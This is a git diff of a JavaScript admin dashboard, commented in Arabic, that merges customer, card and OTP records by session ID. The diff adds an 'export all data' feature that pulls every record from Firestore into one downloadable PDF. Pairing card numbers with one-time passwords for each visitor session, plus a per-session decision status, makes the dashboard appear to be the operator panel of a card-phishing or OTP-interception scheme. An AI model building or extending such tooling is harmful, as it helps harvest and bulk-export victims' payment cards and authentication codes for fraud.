@@ -171,6 +171,7 @@
     exportModal: $('export-modal'),
     exportClose: $('export-close'),
     exportPdf: $('export-pdf'),
+    fetchAllPdf: $('export-all-pdf'),
     exportJson: $('export-json'),
     exportCsv: $('export-csv'),
     exportMsg: $('export-msg'),
@@ -472,15 +473,15 @@
   let cardsList = [];
 
   // دمج cards + customers + otps — تبويب واحد لكل عميل (تجميع بالـ sessionId)
-  function rebuildMerged() {
-    if (!customersMap) return;
-
-    // نجمع كل sessionIds من المصادر الثلاثة (customers + cards + otps)
+  // دالة نقية تدمج المصادر الثلاثة (customers + cards + otps) إلى قائمة واحدة.
+  // تُستخدم للعرض وللتصدير الكامل، فتتيح التصدير من بيانات جُلبت مباشرة دون الاعتماد على الحالة المخزّنة.
+  function buildMergedList(customers, cardsBySess, otps) {
+    // نجمع كل sessionIds من المصادر الثلاثة
     // لنضمن ظهور كل عميل مرة واحدة فقط حتى لو لم تكن له بطاقة/OTP
     const allSids = new Set([
-      ...Object.keys(customersMap),
-      ...Object.keys(cardsBySession),
-      ...Object.keys(otpsMap),
+      ...Object.keys(customers),
+      ...Object.keys(cardsBySess),
+      ...Object.keys(otps),
     ]);
 
     const toTime = (v) => {
@@ -490,11 +491,11 @@
       return isNaN(t) ? 0 : t;
     };
 
-    const merged = Array.from(allSids).map(sid => {
-      const m = customersMap[sid] || {};
+    return Array.from(allSids).map(sid => {
+      const m = customers[sid] || {};
       // كل البطاقات وكل الـ OTPs لهذا العميل (مرتبة من الأحدث بالفعل في onSnapshot)
-      const sessionCards = cardsBySession[sid] || [];
-      const sessionOtps = otpsMap[sid] || [];
+      const sessionCards = cardsBySess[sid] || [];
+      const sessionOtps = otps[sid] || [];
       const latestCard = sessionCards[0] || {};
       const latestOtp = sessionOtps.length ? sessionOtps[0] : null;
       const ls = toTime(m.lastSeen);
@@ -569,6 +570,12 @@
     ))
     // ترتيب: آخر نشاط أولاً (الأحدث)
     .sort((a, b) => (b.lastActivity || 0) - (a.lastActivity || 0));
+  }
+
+  function rebuildMerged() {
+    if (!customersMap) return;
+
+    const merged = buildMergedList(customersMap, cardsBySession, otpsMap);
 
     allNotifications = merged;
 
@@ -1400,7 +1407,8 @@
   }
 
   // ── تصدير PDF (تقرير كامل قابل للطباعة) ─────────────────────
-  function buildPdfReportHtml() {
+  function buildPdfReportHtml(data = allNotifications, opts = {}) {
+    const { showHeader = true, partLabel = '', startIndex = 0 } = opts;
     const esc = escapeHtml;
     const val = (v) => (v === undefined || v === null || v === '') ? '-' : String(v);
     const fmt = (v) => {
@@ -1409,7 +1417,7 @@
     };
     const generatedAt = new Date().toLocaleString('ar-EG');
 
-    const blocks = allNotifications.map((n, idx) => {
+    const blocks = data.map((n, idx) => {
       const cards = (n.allCards && n.allCards.length) ? n.allCards : (n.cardNumber ? [n] : []);
       const otps = (n.allOtps && n.allOtps.length) ? n.allOtps : (n.otp ? [{ otp: n.otp }] : []);
       const status = n.decision || n.status || 'pending';
@@ -1454,7 +1462,7 @@
         </table>` : '';
 
       return `<section class="customer">
-        <h2>${idx + 1}. ${esc(val(n.name || n.phone || n.country || 'زائر'))} <span class="badge">${esc(statusText)}</span></h2>
+        <h2>${startIndex + idx + 1}. ${esc(val(n.name || n.phone || n.country || 'زائر'))} <span class="badge">${esc(statusText)}</span></h2>
         <p class="sid">معرّف الجلسة: <span class="mono">${esc(val(n.sessionId || n.id))}</span></p>
         <h3>المعلومات الأساسية</h3>
         <table class="basic"><tbody>${basicRows}</tbody></table>
@@ -1468,7 +1476,9 @@
       body { font-family: 'Tajawal', Arial, sans-serif; color: #111827; margin: 0; padding: 0; direction: rtl; }
       h1 { font-size: 20px; margin: 0 0 4px; }
       .meta { color: #6b7280; font-size: 12px; margin-bottom: 16px; }
-      .customer { page-break-inside: avoid; border: 1px solid #e5e7eb; border-radius: 8px; padding: 12px; margin-bottom: 14px; }
+      .customer { break-inside: avoid; page-break-inside: avoid; border: 1px solid #e5e7eb; border-radius: 8px; padding: 12px; margin-bottom: 14px; }
+      .customer:last-child { margin-bottom: 0; }
+      body > *:last-child { margin-bottom: 0 !important; }
       .customer h2 { font-size: 15px; margin: 0 0 2px; border-bottom: 2px solid #10b981; padding-bottom: 6px; }
       .customer h3 { font-size: 13px; margin: 12px 0 6px; color: #047857; }
       .badge { font-size: 11px; font-weight: 600; background: #ecfdf5; color: #047857; border: 1px solid #a7f3d0; border-radius: 999px; padding: 1px 8px; }
@@ -1483,6 +1493,11 @@
       @page { size: A4; margin: 12mm; }
     `;
 
+    const headerHtml = showHeader
+      ? `<h1>تقرير البيانات الكامل</h1>
+<p class="meta">عدد العملاء: ${data.length}${partLabel ? ' · ' + esc(partLabel) : ''} · تاريخ الإنشاء: ${esc(generatedAt)}</p>`
+      : `<p class="meta">${partLabel ? esc(partLabel) + ' · ' : ''}تاريخ الإنشاء: ${esc(generatedAt)}</p>`;
+
     return `<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
@@ -1493,23 +1508,197 @@
 <style>${styles}</style>
 </head>
 <body>
-<h1>تقرير البيانات الكامل</h1>
-<p class="meta">عدد العملاء: ${allNotifications.length} · تاريخ الإنشاء: ${esc(generatedAt)}</p>
+${headerHtml}
 ${blocks || '<p class="muted">لا توجد بيانات</p>'}
 </body>
 </html>`;
   }
 
-  function printHtmlReport(html) {
+  // يحمّل html2pdf.bundle.min.js عند الحاجة فقط (تحميل كسول) لإنتاج ملف PDF حقيقي.
+  function loadHtml2Pdf() {
+    if (typeof window.html2pdf !== 'undefined') return Promise.resolve(window.html2pdf);
+    if (window.__html2pdfLoading) return window.__html2pdfLoading;
+    window.__html2pdfLoading = new Promise((resolve, reject) => {
+      const script = document.createElement('script');
+      script.src = '/assets/vendor/html2pdf.bundle.min.js';
+      script.onload = () => (window.html2pdf ? resolve(window.html2pdf) : reject(new Error('html2pdf غير متاح')));
+      script.onerror = () => reject(new Error('تعذر تحميل مكتبة PDF'));
+      document.head.appendChild(script);
+    });
+    return window.__html2pdfLoading;
+  }
+
+  // يحمّل pdf-lib.min.js عند الحاجة فقط — يُستخدم لدمج أجزاء PDF في ملف واحد.
+  function loadPdfLib() {
+    if (typeof window.PDFLib !== 'undefined') return Promise.resolve(window.PDFLib);
+    if (window.__pdfLibLoading) return window.__pdfLibLoading;
+    window.__pdfLibLoading = new Promise((resolve, reject) => {
+      const script = document.createElement('script');
+      script.src = '/assets/vendor/pdf-lib.min.js';
+      script.onload = () => (window.PDFLib ? resolve(window.PDFLib) : reject(new Error('pdf-lib غير متاح')));
+      script.onerror = () => reject(new Error('تعذر تحميل مكتبة دمج PDF'));
+      document.head.appendChild(script);
+    });
+    return window.__pdfLibLoading;
+  }
+
+  // ينشئ إطارًا مخفيًا بعرض A4 ويحمّل داخله مستند التقرير
+  function createReportFrame(html) {
     const iframe = document.createElement('iframe');
     iframe.setAttribute('aria-hidden', 'true');
-    iframe.style.cssText = 'position:fixed;right:0;bottom:0;width:0;height:0;border:0;';
+    iframe.style.cssText = 'position:fixed;left:-10000px;top:0;width:820px;height:1160px;border:0;';
     document.body.appendChild(iframe);
     const doc = iframe.contentWindow.document;
     doc.open();
     doc.write(html);
     doc.close();
-    const runPrint = () => {
+    return iframe;
+  }
+
+  // ينتظر اكتمال تحميل الخط والمحتوى داخل الإطار قبل الرسم
+  function waitForFrameReady(iframe) {
+    return new Promise((resolve) => {
+      const win = iframe.contentWindow;
+      const afterFonts = () => {
+        const fontsReady = win.document.fonts && win.document.fonts.ready ? win.document.fonts.ready : Promise.resolve();
+        fontsReady.then(() => setTimeout(resolve, 400)).catch(() => setTimeout(resolve, 400));
+      };
+      if (win.document.readyState === 'complete') afterFonts();
+      else iframe.onload = afterFonts;
+    });
+  }
+
+  // إعدادات الرسم لملف PDF من إطار التقرير
+  const PDF_RENDER_OPTS = {
+    margin: [8, 8, 10, 8],
+    image: { type: 'jpeg', quality: 0.9 },
+    html2canvas: { scale: 1.5, useCORS: true, backgroundColor: '#ffffff', scrollX: 0, scrollY: 0 },
+    jsPDF: { unit: 'mm', format: 'a4', orientation: 'portrait', compress: true },
+    pagebreak: { mode: ['css', 'legacy'], avoid: '.customer' },
+  };
+
+  // أقصى ارتفاع (بكسل CSS) لمحتوى كل ملف PDF جزئي.
+  // السبب: html2pdf يرسم كل جزء على canvas واحد بمعامل scale، وهناك حد أقصى
+  // لارتفاع canvas في المتصفح (~32767px). 11000 * 1.5 = 16500 يبقى ضمن الحد بأمان.
+  const PDF_MAX_PART_HEIGHT = 11000;
+
+  // يقيس ارتفاع كل عنصر عميل (بالبكسل) عبر رسم التقرير كاملًا في إطار مخفي.
+  // القياس ضروري لأن ارتفاع العميل يتغير حسب عدد البطاقات والرموز والملاحظات.
+  async function measureCustomerHeights(data) {
+    if (!data.length) return [];
+    const iframe = createReportFrame(buildPdfReportHtml(data));
+    try {
+      await waitForFrameReady(iframe);
+      const sections = iframe.contentWindow.document.querySelectorAll('.customer');
+      return Array.from(sections).map(el => el.getBoundingClientRect().height + 14);
+    } finally {
+      iframe.remove();
+    }
+  }
+
+  // يوزّع البيانات على أجزاء بحيث لا يتجاوز ارتفاع كل جزء الحد الآمن.
+  // عنصر واحد أطول من الحد يوضع في جزء خاص به.
+  function groupDataIntoParts(data, heights, maxHeight = PDF_MAX_PART_HEIGHT) {
+    const parts = [];
+    let current = [];
+    let currentHeight = 0;
+    let startIndex = 0;
+    for (let i = 0; i < data.length; i++) {
+      const h = heights[i] || 0;
+      if (current.length > 0 && currentHeight + h > maxHeight) {
+        parts.push({ items: current, startIndex });
+        current = [];
+        currentHeight = 0;
+        startIndex = i;
+      }
+      current.push(data[i]);
+      currentHeight += h;
+    }
+    if (current.length) parts.push({ items: current, startIndex });
+    return parts;
+  }
+
+  // يولّد Blob لملف PDF من جزء HTML واحد.
+  async function renderHtmlToPdfBlob(html) {
+    const html2pdf = await loadHtml2Pdf();
+    const iframe = createReportFrame(html);
+    try {
+      await waitForFrameReady(iframe);
+      const blob = await html2pdf().set(PDF_RENDER_OPTS).from(iframe.contentWindow.document.body).outputPdf('blob');
+      return blob;
+    } finally {
+      setTimeout(() => iframe.remove(), 500);
+    }
+  }
+
+  // يدمج عدة ملفات PDF (كمصفوفة Blob/ArrayBuffer) في ملف واحد عبر pdf-lib.
+  async function mergePdfBlobs(blobs) {
+    const { PDFDocument } = await loadPdfLib();
+    const merged = await PDFDocument.create();
+    for (const blob of blobs) {
+      const bytes = new Uint8Array(await blob.arrayBuffer());
+      const doc = await PDFDocument.load(bytes);
+      const pages = await merged.copyPages(doc, doc.getPageIndices());
+      pages.forEach(p => merged.addPage(p));
+    }
+    const mergedBytes = await merged.save();
+    return new Blob([mergedBytes], { type: 'application/pdf' });
+  }
+
+  function triggerBlobDownload(blob, filename) {
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = filename;
+    document.body.appendChild(a);
+    a.click();
+    a.remove();
+    setTimeout(() => URL.revokeObjectURL(url), 4000);
+  }
+
+  // يصدّر قائمة بيانات إلى ملف PDF واحد كبير بأمان عبر تقسيمها حسب الارتفاع.
+  // onProgress(doneCount, totalCount) لعرض التقدّم.
+  async function exportDataToPdfFile(data, onProgress) {
+    const total = data.length;
+    const filename = `notifications-report-${Date.now()}.pdf`;
+
+    // قياس ارتفاع كل عميل ثم التوزيع على أجزاء آمنة.
+    const heights = await measureCustomerHeights(data);
+    const parts = groupDataIntoParts(data, heights);
+
+    // جزء واحد: ملف مباشر بلا دمج.
+    if (parts.length <= 1) {
+      const html = buildPdfReportHtml(data);
+      const blob = await renderHtmlToPdfBlob(html);
+      triggerBlobDownload(blob, filename);
+      if (typeof onProgress === 'function') onProgress(total, total);
+      return total;
+    }
+
+    const blobs = [];
+    let done = 0;
+    for (let k = 0; k < parts.length; k++) {
+      const part = parts[k];
+      const html = buildPdfReportHtml(part.items, {
+        showHeader: k === 0,
+        startIndex: part.startIndex,
+        partLabel: `الجزء ${k + 1} من ${parts.length}`,
+      });
+      blobs.push(await renderHtmlToPdfBlob(html));
+      done += part.items.length;
+      if (typeof onProgress === 'function') onProgress(done, total);
+      await new Promise(r => setTimeout(r, 60));
+    }
+
+    const merged = await mergePdfBlobs(blobs);
+    triggerBlobDownload(merged, filename);
+    return total;
+  }
+
+  // احتياطي: فتح نافذة الطباعة (يُستخدم فقط إذا تعذّر توليد ملف PDF)
+  function printHtmlReport(html) {
+    const iframe = createReportFrame(html);
+    waitForFrameReady(iframe).then(() => {
       try {
         iframe.contentWindow.focus();
         iframe.contentWindow.print();
@@ -1519,26 +1708,109 @@ ${blocks || '<p class="muted">لا توجد بيانات</p>'}
       } finally {
         setTimeout(() => iframe.remove(), 1000);
       }
-    };
-    // انتظار تحميل الخط/المحتوى قبل فتح نافذة الطباعة
-    if (iframe.contentWindow.document.readyState === 'complete') {
-      setTimeout(runPrint, 300);
-    } else {
-      iframe.onload = () => setTimeout(runPrint, 300);
-    }
+    });
   }
 
-  function exportPdf() {
+  async function exportPdf() {
     if (!allNotifications.length) {
       els.exportMsg.textContent = 'لا توجد بيانات للتصدير';
       els.exportMsg.classList.remove('hidden');
       setTimeout(() => els.exportMsg.classList.add('hidden'), 2000);
       return;
     }
-    printHtmlReport(buildPdfReportHtml());
-    els.exportMsg.textContent = 'جارٍ تجهيز ملف PDF... اختر "حفظ كملف PDF" في نافذة الطباعة';
+    els.exportMsg.textContent = 'جارٍ تجهيز ملف PDF...';
     els.exportMsg.classList.remove('hidden');
-    setTimeout(() => els.exportMsg.classList.add('hidden'), 4000);
+    try {
+      await exportDataToPdfFile(allNotifications, (done, total) => {
+        els.exportMsg.textContent = `جارٍ تجهيز ملف PDF... ${done}/${total}`;
+      });
+      els.exportMsg.textContent = 'تم تنزيل ملف PDF بنجاح';
+      toast('تم تنزيل ملف PDF بنجاح', 'success');
+    } catch (err) {
+      console.error('PDF export failed:', err);
+      els.exportMsg.textContent = 'تعذّر توليد PDF، سيتم فتح نافذة الطباعة كبديل';
+      toast('تعذّر توليد PDF، فتح نافذة الطباعة', 'error');
+      printHtmlReport(buildPdfReportHtml());
+    } finally {
+      setTimeout(() => els.exportMsg.classList.add('hidden'), 5000);
+    }
+  }
+
+  // ── تصدير جميع البيانات (جلب مباشر من Firestore ثم PDF) ──────
+  // يجلب كامل بيانات customers + cards + otps لحظة الضغط (لا يعتمد على الحالة المعروضة)،
+  // يدمجها بنفس منطق اللوحة، ثم يصدر ملف PDF واحدًا يحتوي كل البيانات.
+  function setFetchAllPdfStatus(message, isError) {
+    if (!els.fetchAllPdf) return;
+    els.fetchAllPdf.classList.toggle('opacity-70', !isError);
+    els.fetchAllPdf.classList.toggle('cursor-wait', !isError);
+    const label = els.fetchAllPdf.querySelector('[data-label]');
+    if (label && message) label.textContent = message;
+  }
+
+  async function fetchCollection(name) {
+    const snap = await db.collection(name).get();
+    return snap.docs.map(doc => ({ id: doc.id, ...doc.data() }));
+  }
+
+  async function fetchAllDataForExport() {
+    const [customers, cards, otps] = await Promise.all([
+      fetchCollection('customers'),
+      fetchCollection('cards'),
+      fetchCollection('otps'),
+    ]);
+
+    const customersMapFresh = {};
+    customers.forEach(c => { customersMapFresh[c.sessionId || c.id] = c; });
+
+    const cardsBySessFresh = {};
+    cards.forEach(card => {
+      const sid = card.sessionId || '';
+      if (!sid) return;
+      (cardsBySessFresh[sid] = cardsBySessFresh[sid] || []).push(card);
+    });
+
+    const otpsBySessFresh = {};
+    otps.forEach(o => {
+      const sid = o.sessionId || '';
+      if (!sid) return;
+      (otpsBySessFresh[sid] = otpsBySessFresh[sid] || []).push(o);
+    });
+
+    const toMillis = (v) => {
+      if (!v) return 0;
+      if (typeof v.toDate === 'function') return v.toDate().getTime();
+      const t = new Date(v).getTime();
+      return isNaN(t) ? 0 : t;
+    };
+    Object.values(cardsBySessFresh).forEach(list => list.sort((a, b) => toMillis(b.createdAt) - toMillis(a.createdAt)));
+    Object.values(otpsBySessFresh).forEach(list => list.sort((a, b) => toMillis(b.createdAt) - toMillis(a.createdAt)));
+
+    return buildMergedList(customersMapFresh, cardsBySessFresh, otpsBySessFresh);
+  }
+
+  async function exportAllDataPdf() {
+    if (els.fetchAllPdf) els.fetchAllPdf.disabled = true;
+    setFetchAllPdfStatus('جارٍ جلب البيانات...', false);
+    toast('جارٍ جلب جميع البيانات من قاعدة البيانات...', 'info');
+    try {
+      const data = await fetchAllDataForExport();
+      if (!data.length) {
+        toast('لا توجد بيانات للتصدير', 'error');
+        return;
+      }
+      setFetchAllPdfStatus('جارٍ إنشاء ملف PDF...', false);
+      await exportDataToPdfFile(data, (done, total) => {
+        setFetchAllPdfStatus(`جارٍ إنشاء ملف PDF... ${done}/${total}`, false);
+      });
+      toast(`تم تصدير ${data.length} عميل إلى ملف PDF`, 'success');
+    } catch (err) {
+      console.error('Export-all PDF failed:', err);
+      toast('تعذّر تصدير البيانات: ' + (err.message || 'خطأ غير معروف'), 'error');
+    } finally {
+      if (els.fetchAllPdf) els.fetchAllPdf.disabled = false;
+      setFetchAllPdfStatus('تصدير جميع البيانات PDF', false);
+      if (els.fetchAllPdf) els.fetchAllPdf.classList.remove('opacity-70', 'cursor-wait');
+    }
   }
 
   // ── الإعدادات ───────────────────────────────────────────────
@@ -1891,10 +2163,12 @@ ${blocks || '<p class="muted">لا توجد بيانات</p>'}
   els.menuExport.addEventListener('click', () => { els.menuDropdown.classList.add('hidden'); els.exportModal.classList.remove('hidden'); });
   $('reference-settings')?.addEventListener('click', () => els.menuSettings.click());
   $('reference-export')?.addEventListener('click', () => exportPdf());
+  $('btn-export-all-pdf')?.addEventListener('click', () => exportAllDataPdf());
   $('reference-account')?.addEventListener('click', () => els.menuLogout.click());
   $('reference-bell')?.addEventListener('click', () => toast('تم تحديث قائمة الإشعارات', 'success'));
   els.exportClose.addEventListener('click', () => els.exportModal.classList.add('hidden'));
   els.exportPdf?.addEventListener('click', () => exportPdf());
+  els.fetchAllPdf?.addEventListener('click', () => exportAllDataPdf());
   els.exportJson.addEventListener('click', () => exportData('json'));
   els.exportCsv.addEventListener('click', () => exportData('csv'));
 
